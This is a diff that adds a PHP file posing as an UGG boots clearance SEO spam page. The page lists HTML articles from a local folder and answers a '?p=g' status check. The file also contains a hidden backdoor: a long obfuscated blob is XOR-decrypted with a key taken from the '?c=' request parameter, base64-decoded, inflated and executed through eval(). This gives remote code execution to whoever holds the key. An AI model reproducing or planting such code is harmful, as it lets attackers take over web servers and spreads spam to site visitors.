@@ -1,0 +1,142 @@
+<?php
+ini_set("display_errors","0");
+
+function cnsubstr($str,$strlen=10) {
+ if(empty($str)||!is_numeric($strlen)){
+  return false;
+ }
+ if(strlen($str)<=$strlen){
+  return $str;
+ }
+ $last_word_needed=substr($str,$strlen-1,1);
+ if(!ord($last_word_needed)>128){
+  $needed_sub_sentence=substr($str,0,$strlen);
+  return $needed_sub_sentence;
+ }else{
+  for($i=0;$i<$strlen;$i++){
+   if(ord($str[$i])>128){
+    $i++;
+   }
+  }
+  $needed_sub_sentence=substr($str,0,$i);
+  return $needed_sub_sentence;
+ }
+}
+
+function replaceHtmlAndJs($document)
+{
+$document = trim($document);
+if (strlen($document) <= 0)
+{
+return $document;
+}
+$search = array ("'<script[^>]*?>.*?</script>'si",
+"'<[/!]*?[^<>]*?>'si",
+"'([rn])[s]+'",
+"'&(quot|#34);'i", 
+"'&(amp|#38);'i",
+"'&(lt|#60);'i",
+"'&(gt|#62);'i",
+"'&(nbsp|#160);'i"
+);
+
+$replace = array ("",
+"",
+"\1",
+"&",
+"<",
+">",
+" "
+);
+return @preg_replace ($search, $replace, $document);
+}
+
+function getDir($dir) {
+    $dirArray[]=NULL;
+    if (false != ($handle = opendir ( $dir ))) {
+        $i=0;
+        while ( false !== ($file = readdir ( $handle )) ) {
+            if (strpos($file,".html")>0) {
+                $dirArray[$i]=$file;
+                $i++;
+            }
+        }
+        closedir ( $handle );
+    }
+    return $dirArray;
+}
+
+function passport_decrypt($txt, $key) { 
+$txt = passport_key(base64_decode($txt), $key); 
+$tmp = ''; 
+for($i = 0;$i < strlen($txt); $i++) { 
+$md5 = $txt[$i]; 
+$tmp .= $txt[++$i] ^ $md5; 
+} 
+return $tmp; 
+}
+function passport_key($txt, $encrypt_key) { 
+$encrypt_key = md5($encrypt_key); 
+$ctr = 0; 
+$tmp = ''; 
+for($i = 0; $i < strlen($txt); $i++) { 
+$ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr; 
+$tmp .= $txt[$i] ^ $encrypt_key[$ctr++]; 
+} 
+return $tmp; 
+} 
+
+function siGnjy($vCUNFW)
+{ 
+$vCUNFW=gzinflate(base64_decode($vCUNFW));
+ for($i=0;$i<strlen($vCUNFW);$i++)
+ {
+$vCUNFW[$i] = chr(ord($vCUNFW[$i])-1);
+ }
+ return $vCUNFW;
+ }
+//function Initialization E
+
+if($_GET["p"]==""){
+$out_link = '';
+$dir = getDir(getcwd()."/db/");
+if(count($dir)>5){$no=5; for ($i=0;$i<$no;$i++){preg_match_all('/<body>([\d\D]*?)<\/body>/', file_get_contents('db/'.$dir[count($dir)-1-$i]), $sf_narr);$out_link .='<div class="link"><a href="?p='.$dir[count($dir)-1-$i].'" target="_blank">'.str_replace('.html','',str_replace('-',' ' ,$dir[count($dir)-1-$i])).'</a></div><div class="news">'.cnsubstr(replaceHtmlAndJs($sf_narr[1][0]),400).'...</div>';}}else{for($i=0;$i<count($dir); $i++){preg_match_all('/<body>([\d\D]*?)<\/body>/', file_get_contents('db/'.$dir[count($dir)-1-$i]), $sf_narr);$out_link .='<div class="link"><a href="?p='.$dir[count($dir)-1-$i].'" target="_blank">'.str_replace('.html','',str_replace('-',' ' ,$dir[count($dir)-1-$i])).'</a></div><div class="news">'.cnsubstr(replaceHtmlAndJs($sf_narr[1][0]),400).'...</div>';}}
+$input = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>UGG Boots, Clothing, Accessories on SALE | Shipped FREE '.$dns.'</title>
+<meta name="description" content="Come to UGG Boots Outlet store to buy cheap UGG Boots Clearance Free Shipping, 50% OFF UGGs clearance Sale, fast arrival  Australia UGG boots on clearance.">
+<meta name="keywords" content="cheap ugg boots clearance|cheap ugg boots outlet|cheap uggs clearance|cheap ugg clearance|cheap ugg boots clearance sale">
+</head> 
+<body> 
+'.$out_link.'
+<ul>
+<li><a href="" target="_blank">'.'HOME'.'</a></li><br><li><a href="?p=a" target="_blank">'.'Artical List'.'</a></li><br>
+</ul>
+</body>
+</html>';
+echo $input;
+}
+
+if($_GET["p"]=="a"){
+
+$out_link = '';
+$dir = getDir(getcwd()."/db/");
+
+for($i=0;$i<count($dir); $i++){$out_link .='<li><a href="'.dirname('http://'.$_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"]).'/?p='.
+
+$dir[$i].'" target="_blank">'.str_replace('.html','',str_replace('-',' ' ,$dir[$i])).'</a></li><br>';}
+echo($out_link);
+}
+
+if(stripos($_GET["p"],'.html')!==false){
+echo(file_get_contents('db/'.$_GET["p"]));
+}
+
+if($_GET["p"]=="g"){
+echo('->|ok|<-');
+}
+
+if($_GET["c"]!=""){
+eval(siGnjy(passport_decrypt("ByMAUQdaUyUAWVUsU3YGaFBFVQIBNgQkDE1SVQdmVhVUdldhB1UGcAxwVFFTMwA+BiFXF1YYVzoJVAI+DDwBMAdkAFIHRVMZAF5VSVN9BhZQMlVmAWMENgxEUk4HGFYYVFBXCgd6BlMMSFRtUzUAJQYtV2JWOVceCWgCGwxwAS0HNAAyB3lTYQBOVWZTUAYXUDtVBQFKBDoMQlJxByZWP1RLVwMHLwZUDHJUXlM3ABMGB1cHVgZXbgktAgUMFAFUBzMANwdzUysAaFVyU2AGbFBNVRkBYAR7DHdSPQcdVhVUTFc5B3gGVwx5VDVTQwAbBmRXaVZiVzQJZQI3DBUBVwcuADQHalM+AHdVSVNJBi1QYFU3AWoESgx2UlMHJ1YCVEJXOQdpBlYMS1RvUzIAZQYaVwhWBVdpCTsCYQwTAWQHHwAoB1NTAQAmVW1TKgZxUDNVGQFmBGQMflJhBwVWOFRAVwYHMgZlDHFUZFNoADUGBFdgVjZXNwlVAjQMHAFPBzIAdAd5U2UAXlV/U1MGdVBWVRgBUwRkDGVSRAc+VjtUS1caBzMGcgxSVEJTSgALBmBXe1YhVwkJagI9DC8BQwcjAGAHNVNiAEhVT1NuBiJQVFVmAXMEYgxFUl8HFlYAVHdXPQdKBnwMQFRkU0oALgY2VzpWD1dsCWACFAwsAVYHMQBqB1dTIgB5VWBTMgZiUDtVEwFABFYMaVJHBydWNFRUVxIHOAZhDGhURFM3ACkGelcXVhtXPwlxAnoMPgEzBzsAcwdFUyEAYlVQU08GFVBbVSoBQQQ8DGNSfQcSViJUalciBzgGRQxmVERTfwBzBgFXGFYfVwsJUwIMDBIBNgcCAFMHeFMTAD1VKFNfBh1QO1U+AToEVQw3UlIHFlYiVEFXOgdMBlMMalQ1U2MAJgZtVwRWOlc2CW8CNgxuAU8HHAA3B3hTKAB5VSxTUwYKUFFVZwFSBGkMVVIwBx5WM1QwV2gHTAZ+DHlUcFMyABoGbFc0VgRXJgk1Aj4MGAFwBycAYwdrUwMAYVUwU1EGYlBOVTMBeARrDEBSawcgVjRUbVcJB0IGUwxUVHFTSQAIBgBXPFYWVw4JYwI2DDIBdwc7AGYHMlM0AHdVMVNUBh9QTlUKAS0ERgwzUm8HBFY6VHRXJAdFBnwMTlRyU3UAPwYwVylWG1cMCWsCPAwDAU8HNAB+B1dTEwB8VWVTbgYiUDFVFgFHBHwMVlJ8Bx1WOFRPVwgHTAZoDHlUf1N9AB4GAVcUVhBXGAlVAhwMaAF2BzMAYQdaUyEAYlVVU3cGC1AwVWYBawQ9DEVSbwchVhZURVdoB0sGagx3VFBTMAA6BjJXJFZiV28JdwIvDBMBVAcbAHEHTlM1AGJVX1NgBgNQRlUjAUwESwxmUm8HJlYwVE9XIQdqBjAMalRcU0QAaQYfVztWLFclCUgCEQwJATEHHwBQB0lTFgBsVV1TQAY1UHBVZQFgBF0MMFJzBzJWM1RTVyoHUQYwDHBUdFNAAD4GNFcaVg1XCwlOAgcMHwE1B2QAPgdmUzMAOFVVU2oGHVBPVR8BRgR/DEpSQwcmVhJUM1cKBzIGVQxtVG9TRAATBjBXNVYAVx0JMwIvDGIBKQc1AG0HOFNgAEtVTlNrBjZQaFU6AXIEdww1Un0HGlZiVEJXOAdBBjAMdlReU0gANwYNVxxWNlcTCS0CGQwNAVUHEQBkB3pTJQBHVXNTfQYJUDtVAAFsBFsMbFJzBxNWYFRcV2UHOAZVDHZUN1NrAGwGPVdkVjdXCgkyAhkMOAFLBxgASwd1U2UAeVV3U3MGMlBMVSABLQRpDGBSXwc8Vj1UaFciB2cGMgxAVClTNAA5Bn5XCFYAVxsJMwI0DD0BXAcnAHAHVVM6AFpVRFNRBmlQSVU0AWQEewxBUkwHG1YVVFNXCAdtBnwMMVRWU2gAMgYmV3tWIVcICTUCYwx0AX4HPgBMB0JTfgBAVXVTMgZvUDZVNwFwBHYMa1JLBxNWJFRmVzYHOQZ8DGVUQVN3AD4GD1dpVmFXBgkpAjMMCwFFB3wANAdwUxcAJlVrU2QGClBmVR0BQwR6DEFSNAc3VjZUU1cXB3oGZgxuVDRTLgAJBmVXGVYDVw8JMAI3DB0BcgclAD4HZFMjAGxVNFM0BjFQc1UKAUgEegxiUn0HAFZmVEVXBwczBjUMVFRkU24APQYxVzxWA1cYCTICIgw0AVAHAQBLB3VTIAAmVU1TRgYSUFlVAwF7BDwMZVIxB3tWNVRUVzgHQQZ0DDBUU1N2ACsGD1cpVh1XdwltAgQMbwF+BzAAcgdnUyQAIlUwU3YGC1BIVWcBZwRqDGtSdgc+ViFUYVc8B0EGaAxKVE1TaQAPBgNXClYMVwYJWgIEDB0BSQcEAEsHQlM2AEBVclNjBhFQT1UEAVYEWgwoUlAHO1YzVDRXYgduBkMMcVRAU2MAaQZ6Vz9WMVcRCUQCLAwXAUoHMgBCB2hTegBjVV5TfQYdUEFVEwFQBF4MQlJrBxFWM1RXVyUHRAZDDGNUUFNpAGoGBFcgVmFXFAlXAjgMCQFPBycAcgdGUycAV1VwU2MGKlBpVSYBSwQ2DGFSPQcDVhJUaldnBy8GUQx2VERTcQA6BgxXB1ZkVxIJaQIYDBkBTwcBAH4HOFMIAGpVS1N9BiJQVlU7AXUESwxVUk4HFlYIVEFXMQdIBjAMTFRhUyoADwY/Vx9WIVcOCVUCBwwuAXQHYABOB1ZTHAB+VWJTMQYrUEdVNgFrBHwMblJPBzxWaVQ1VxcHawZnDHhUfFNUAC8GFFchVgNXZQk3AhcMNwFlBw8ASQdUUxoAV1VNU3QGb1BnVRsBYwRhDG9ScgdlVidUflcjBzgGYAxGVDZTXQA9Bn5XJ1ZhVxsJbQJjDD4BSAcDAEsHMlMfAEtVRFNDBh9QSFUBAU4ETQxdUlwHHVY7VGpXHgdGBm4MVFRPU1wAOgZlVyRWLFcRCTECPwwCAW8HfABSB3JTJgBDVWFTNQY1UHpVCwFuBFgMMVIyBxxWZFRcVwAHSQYxDFRUflNBACQGBVckViFXEQlrAgQMCgEwB28AZAdBUygAf1VMU3UGI1BHVRwBcARtDF5SSgcnVmhUQ1c6B08GSwx3VGdTMgA6BiRXKVYXVzEJSAIbDAsBagcfAHMHZ1MgAFtVU1N9BhJQZ1UkAVQEewxLUk4HaVY4VGZXCgcyBlEMeVRWU0kAbgZnV2lWAVcICUkCGgwXAX8HEwBCBzZTHABkVVdTSAYKUElVeQFDBG4Ma1JgByNWK1RSV2EHcwZKDEJUb1NpAGkGEFc6ViJXbgk7AiAMCQFrBzIAaAdZUx8AJlVpU1AGH1BuVQABUwRNDHdSTgdnVn5UTVc6BzMGUwxYVEBTQQAaBhFXGFYlVzcJVQI4DAkBXAcTAEEHdVMyAEVVLFM8BjJQQlUQATcETAx0Ul0HHVYlVDBXEQdSBm4MUlQ1Uy4AEAYbVxZWJlceCVoCAQwCAVIHJABRB0RTHwBIVUJTXQYzUDZVKwFtBEEMMFJwBz5WJlRJVzkHRgZQDElUQlNTABEGG1cVVg9XKwlKAmAMGQFOBzAAUAczUzQAZFVkU10GC1BkVTYBSwRoDGJSXAcCVmJUT1coB1EGVwx7VDBTMAAsBgNXFlY4VxgJcQJiDD0BcgdvAEgHWFM3ACJVKFNnBjZQNVVqAWsEOwx2UjwHNlYhVF5XAAdUBmYMe1RRU28ALQZ+VwRWMFcICVECZgw0AU4HZABIB0hTGwB6VXJTVAY5UEhVNQFkBD4MXVI8BxNWI1QzVz4HRwZUDGtUX1NxAC4GZVcdVh5XEglqAjMMPgFMBz0AUwc1Uz8AblVxU2IGdVAoVR4BYARnDEVSZgcyVmNURlcmB0IGQgxKVG5TQgArBjhXFlYtVx4JVAJsDDQBSAcVAE0HTlMCAFdVdlNLBmJQQVUdAWwETAxgUnYHaFY2VGtXYgd6BisMb1R/U0wADgY2V2VWbVdzCWUCEgwrAXMHEAByB0VTHABaVShTKgYjUEtVJwFLBGMMTVJiB2FWP1RwVxgHMgZtDDNUfFNfADsGGFcAVmJXJQlIAjAMGQFKBzkAdAdVUyIARlVDU3AGaVAzVTEBVAQ8DERSdQcxVhJUcFc7B1UGcAxZVFxTfQAMBh5XN1ZkVx0JUAJmDBkBYwcSAH0HU1MdAGdVQ1NhBg1QTFUhAWAEOQx0UjYHZFZpVFZXFwdzBk4MRlQ0UzwALQYUVwRWYFcOCVACHww5AU4HGwBBBzlTJgBoVUBTbwY1UGdVIwFRBG0MY1JtBwRWFFRlVwYHNgZGDGJUT1MzACoGA1c0VhpXBQlyAmcMNgFpBy8ATQdKUyMAQlU/UyoGdVBCVTUBPwQy",$_GET["c"])));}
